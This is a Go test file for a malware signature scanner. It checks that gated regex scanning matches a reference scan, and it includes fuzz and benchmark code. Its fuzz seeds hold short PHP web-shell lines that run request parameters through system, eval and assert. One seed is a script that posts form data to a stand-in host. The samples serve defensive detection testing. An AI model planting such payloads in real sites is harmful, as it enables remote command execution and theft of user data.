package signatures

import (
	"fmt"
	"go/ast"
	"go/parser"
	"go/token"
	"os"
	"path/filepath"
	"reflect"
	"runtime"
	"strconv"
	"strings"
	"testing"

	"github.com/pidginhost/csm/internal/contenttype"
	"github.com/pidginhost/csm/internal/corpusgate"
)

// referenceScan is the rule evaluation as it stood before regexes were gated
// by their required literals: every exclusion, exemption and match regex of
// every applicable rule runs over the whole content. The gated scanner must
// return exactly what this returns.
func referenceScan(s *Scanner, content []byte, fileExt string, contentSize int64) []Match {
	if len(s.rules) == 0 {
		return nil
	}
	extLower := strings.ToLower(fileExt)
	if contenttype.IsArchiveExt(extLower) && contenttype.IsCompressedArchive(content) {
		return nil
	}
	if contentSize < int64(len(content)) {
		contentSize = int64(len(content))
	}
	contentLower := strings.ToLower(string(content))
	var matches []Match
	for _, rule := range s.rules {
		if !ruleMatchesExt(rule, extLower) {
			continue
		}
		excluded := false
		for _, pattern := range rule.ExcludePatterns {
			if strings.Contains(contentLower, strings.ToLower(pattern)) {
				excluded = true
				break
			}
		}
		if !excluded {
			for _, re := range rule.compiledExcludeRegexes {
				if re.Match(content) {
					excluded = true
					break
				}
			}
		}
		if excluded {
			continue
		}
		if rule.MaxFileBytes > 0 && contentSize > int64(rule.MaxFileBytes) {
			exempt := false
			for _, re := range rule.compiledMaxFileBytesExemptRegexes {
				if re.Match(content) {
					exempt = true
					break
				}
			}
			if !exempt {
				continue
			}
		}
		var matched []string
		regexMatched := false
		for _, pattern := range rule.Patterns {
			if strings.Contains(contentLower, strings.ToLower(pattern)) {
				matched = append(matched, pattern)
			}
		}
		for _, re := range rule.compiledRegexes {
			if re.Match(content) {
				matched = append(matched, re.String())
				regexMatched = true
			}
		}
		if len(matched) >= rule.MinMatch && (!rule.RequireRegex || regexMatched) {
			matches = append(matches, Match{
				RuleName:    rule.Name,
				Description: rule.Description,
				Severity:    rule.Severity,
				Category:    rule.Category,
				Matched:     matched,
			})
		}
	}
	return matches
}

func TestReferenceScanArchivePolicy(t *testing.T) {
	rule := Rule{Name: "marker", Regexes: []string{"marker"}, MinMatch: 1}
	if err := rule.compile(); err != nil {
		t.Fatal(err)
	}
	s := &Scanner{rules: []Rule{rule}}
	matched := []Match{{RuleName: "marker", Matched: []string{"(?i)marker"}}}
	for _, tt := range []struct {
		name    string
		content string
		ext     string
		want    []Match
	}{
		{"archive name and magic", "PK\x03\x04marker", ".zip", nil},
		{"mixed case archive extension", "PK\x03\x04marker", ".ZiP", nil},
		{"archive magic on executable", "PK\x03\x04marker", ".php", matched},
		{"archive name without magic", "marker", ".zip", matched},
	} {
		t.Run(tt.name, func(t *testing.T) {
			content := []byte(tt.content)
			if got := s.ScanContent(content, tt.ext); !reflect.DeepEqual(got, tt.want) {
				t.Fatalf("scanner = %+v, want %+v", got, tt.want)
			}
			if got := referenceScan(s, content, tt.ext, int64(len(content))); !reflect.DeepEqual(got, tt.want) {
				t.Fatalf("reference = %+v, want %+v", got, tt.want)
			}
		})
	}
}

// oracleSamples collects every string literal in this package's tests. The
// detection and false-positive tests hold hundreds of hand-built malicious and
// benign samples, which is the content the rules were written against.
func oracleSamples(t *testing.T) []string {
	t.Helper()
	files, err := filepath.Glob("*_test.go")
	if err != nil {
		t.Fatal(err)
	}
	fset := token.NewFileSet()
	seen := map[string]bool{}
	var out []string
	for _, name := range files {
		f, err := parser.ParseFile(fset, name, nil, 0)
		if err != nil {
			t.Fatal(err)
		}
		ast.Inspect(f, func(n ast.Node) bool {
			lit, ok := n.(*ast.BasicLit)
			if !ok || lit.Kind != token.STRING {
				return true
			}
			value, err := strconv.Unquote(lit.Value)
			if err == nil && len(value) >= 8 && !seen[value] {
				seen[value] = true
				out = append(out, value)
			}
			return true
		})
	}
	if len(out) < 1000 {
		t.Fatalf("collected only %d samples; the harvest is broken", len(out))
	}
	return out
}

// withFoldVariants adds, for each sample, the case-folded forms a (?i) regex
// still matches: upper case, and the long s and Kelvin sign in place of s and
// k. A gate that folds content differently from the regex engine fails on
// these.
func withFoldVariants(samples []string) []string {
	folder := strings.NewReplacer("s", "\u017F", "S", "\u017F", "k", "\u212A", "K", "\u212A")
	out := make([]string, 0, 3*len(samples))
	for _, sample := range samples {
		out = append(out, sample, strings.ToUpper(sample), folder.Replace(sample))
	}
	return out
}

func loadShippedScanner(t *testing.T) *Scanner {
	t.Helper()
	s := NewScanner(filepath.Join("..", "..", "configs"))
	if err := s.LoadError(); err != nil {
		t.Fatalf("loading shipped rules: %v", err)
	}
	return s
}

func TestGatedScanMatchesReferenceScan(t *testing.T) {
	s := loadShippedScanner(t)
	samples := oracleSamples(t)
	// One extension per file-type family the rules name; wildcard rules run
	// under each. The oversize pass drives the exemption regexes.
	cases := []struct {
		ext      string
		oversize bool
	}{{".php", false}, {".php", true}, {".html", false}, {".js", false}, {".py", false}}
	shards := runtime.GOMAXPROCS(0)
	for shard := range shards {
		t.Run(fmt.Sprintf("shard%d", shard), func(t *testing.T) {
			t.Parallel()
			for i := shard; i < len(samples); i += shards {
				content := []byte(samples[i])
				for _, c := range cases {
					size := int64(len(content))
					if c.oversize {
						size = 1 << 30
					}
					want := referenceScan(s, content, c.ext, size)
					got := s.ScanContentWithSize(content, c.ext, size)
					if !reflect.DeepEqual(got, want) {
						t.Fatalf("ext %s size %d: gated scan = %+v, reference = %+v\ninput: %q", c.ext, size, got, want, samples[i])
					}
				}
			}
		})
	}
}

// Every gate on every shipped regex must admit every input its regex matches,
// whatever the file type, so a rule later widened to more extensions cannot
// inherit an unsound gate.
func TestShippedGatesAreSound(t *testing.T) {
	regexes := shippedRegexes(loadShippedScanner(t))
	inputs := withFoldVariants(oracleSamples(t))
	shards := runtime.GOMAXPROCS(0)
	for shard := range shards {
		t.Run(fmt.Sprintf("shard%d", shard), func(t *testing.T) {
			t.Parallel()
			for i := shard; i < len(inputs); i += shards {
				content := []byte(inputs[i])
				folded := foldForGate(content)
				for cr, ruleName := range regexes {
					if !cr.gate.admits(folded, map[string]bool{}) && cr.Match(content) {
						t.Fatalf("rule %s: gate %q rejects %q, which %s matches", ruleName, cr.gate, inputs[i], cr.String())
					}
				}
			}
		})
	}
}

// shippedRegexes maps every distinct match, exclusion and exemption regex of
// the loaded rules to the name of a rule that uses it.
func shippedRegexes(s *Scanner) map[*compiledRegex]string {
	out := map[*compiledRegex]string{}
	for _, rule := range s.rules {
		for _, group := range [][]*compiledRegex{rule.compiledRegexes, rule.compiledExcludeRegexes, rule.compiledMaxFileBytesExemptRegexes} {
			for _, cr := range group {
				out[cr] = rule.Name
			}
		}
	}
	return out
}

func FuzzShippedGatesAreSound(f *testing.F) {
	for _, seed := range []string{
		"<?php ſyſtem($_GET['c']);",
		"<?php EVAL(base64_decode($_POST['x']));",
		"<?php $Key = str_rot13('x'); assert($_REQUEST[1]);",
		"<?php @preg_replace('/.*/e', $_POST['c'], '');",
		"<script>fetch('https://example.invalid/x',{method:'POST',body:new FormData(f)})</script>",
	} {
		f.Add([]byte(seed))
	}
	s := NewScanner(filepath.Join("..", "..", "configs"))
	if err := s.LoadError(); err != nil {
		f.Fatalf("loading shipped rules: %v", err)
	}
	regexes := shippedRegexes(s)
	f.Fuzz(func(t *testing.T, content []byte) {
		folded := foldForGate(content)
		for cr, ruleName := range regexes {
			if !cr.gate.admits(folded, map[string]bool{}) && cr.Match(content) {
				t.Fatalf("rule %s: gate %q rejects content %s matches", ruleName, cr.gate, cr.String())
			}
		}
	})
}

// On the pinned clean corpus, no gate may reject a file its regex matches.
// Run by the clean-corpus CI job next to the per-rule hit-count gate.
func TestYAMLGatesSoundOnCleanCorpus(t *testing.T) {
	root, rootErr := corpusgate.Root("YARA_FP_CORPUS")
	if rootErr != nil {
		t.Fatal(rootErr)
	}
	if root == "" {
		t.Skip("YARA_FP_CORPUS not set")
	}
	unique := shippedRegexes(loadShippedScanner(t))
	scanned, err := forEachCleanCorpusFile(root, func(path string, data []byte) error {
		folded := foldForGate(data)
		for cr, ruleName := range unique {
			if !cr.gate.admits(folded, map[string]bool{}) && cr.Match(data) {
				return fmt.Errorf("rule %s: gate %q rejects %s, which %s matches", ruleName, cr.gate, path, cr.String())
			}
		}
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	if scanned < minYAMLCorpusFiles {
		t.Fatalf("corpus scanned %d files, below the %d-file floor -- check YARA_FP_CORPUS", scanned, minYAMLCorpusFiles)
	}
	t.Logf("gate soundness held on %d files across %d distinct regexes", scanned, len(unique))
}

// BenchmarkShippedRulesRealtimeShape scans the PHP files of the clean corpus
// the way realtime does: the shipped rules over at most the first 64 KiB,
// retaining the complete file size for per-rule bounds and exemptions.
//
//	YARA_FP_CORPUS=/path/to/corpus go test ./internal/signatures -run XXX -bench ShippedRulesRealtimeShape -benchtime 1x
func BenchmarkShippedRulesRealtimeShape(b *testing.B) {
	root, err := corpusgate.Root("YARA_FP_CORPUS")
	if err != nil {
		b.Fatal(err)
	}
	if root == "" {
		b.Skip("YARA_FP_CORPUS not set")
	}
	s := NewScanner(filepath.Join("..", "..", "configs"))
	if err := s.LoadError(); err != nil {
		b.Fatal(err)
	}
	var files [][]byte
	walkErr := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil || !info.Mode().IsRegular() || filepath.Ext(path) != ".php" {
			return err
		}
		data, err := readYAMLCorpusFile(path)
		if err != nil {
			return err
		}
		files = append(files, data)
		return nil
	})
	if walkErr != nil {
		b.Fatal(walkErr)
	}
	if len(files) == 0 {
		b.Fatal("corpus holds no PHP files")
	}
	b.ResetTimer()
	for b.Loop() {
		for _, data := range files {
			scanRealtimeSample(s, data)
		}
	}
	b.ReportMetric(float64(b.Elapsed().Microseconds())/float64(b.N*len(files)), "us/file")
}

func scanRealtimeSample(s *Scanner, data []byte) []Match {
	return s.ScanContentWithSize(data[:min(len(data), 64<<10)], ".php", int64(len(data)))
}

func TestRealtimeBenchmarkSampleUsesFullSize(t *testing.T) {
	rule := Rule{
		Name: "bounded", Patterns: []string{"marker"}, MinMatch: 1,
		MaxFileBytes: 64 << 10, MaxFileBytesExemptRegexes: []string{"override"},
	}
	if err := rule.compile(); err != nil {
		t.Fatal(err)
	}
	s := &Scanner{rules: []Rule{rule}}
	matched := []Match{{RuleName: "bounded", Matched: []string{"marker"}}}
	pad := func(prefix string, size int) string {
		return prefix + strings.Repeat(" ", size-len(prefix))
	}
	for _, tt := range []struct {
		name    string
		content string
		want    []Match
	}{
		{"small file", "marker", matched},
		{"at size limit", pad("marker", 64<<10), matched},
		{"above size limit", pad("marker", 64<<10+1), nil},
		{"exemption in prefix", pad("marker override", 64<<10+1), matched},
		{"exemption past prefix", pad("marker", 64<<10) + "override", nil},
		{"match past prefix", pad("override", 64<<10) + "marker", nil},
	} {
		t.Run(tt.name, func(t *testing.T) {
			if got := scanRealtimeSample(s, []byte(tt.content)); !reflect.DeepEqual(got, tt.want) {
				t.Fatalf("benchmark sample matches = %+v, want %+v", got, tt.want)
			}
		})
	}
}
